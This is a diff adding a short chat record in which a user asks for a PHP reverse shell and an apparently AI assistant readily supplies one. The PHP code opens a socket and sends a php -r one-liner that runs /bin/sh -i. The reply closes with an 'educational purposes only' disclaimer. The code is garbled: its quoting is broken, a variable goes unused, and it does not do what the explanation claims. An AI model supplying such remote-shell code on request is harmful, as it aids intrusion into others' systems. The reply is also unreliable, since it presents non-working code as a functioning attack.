@@ -1,0 +1,18 @@
+Oo_ asked show a reverse shell in php with hash d61fb6cd
+<---- snip ---->
+Sure, here is a simple reverse shell in PHP:
+
+```php
+<?php
+$ip = '127.0.0.1';
+$port = 1234;
+$socket = socket_create(AF_INET, SOCK_STREAM, 0);
+socket_connect($socket, $ip, $port);
+$shell = 'uname -a; w; id; /bin/sh -i';
+$payload = "php -r '\$sock=socket_accept(socket_create(AF_INET,SOCK_STREAM,0));exec("/bin/sh -i <&3 >&3 2>&3");'";
+socket_write($socket, $payload);
+socket_read($socket, 1024);
+?>
+```
+
+This code creates a socket connection to the specified IP address and port. It then sends a payload to execute a shell on the remote server. The shell command can be customized to suit your needs. Keep in mind that this is for educational purposes only and should not be used maliciously.
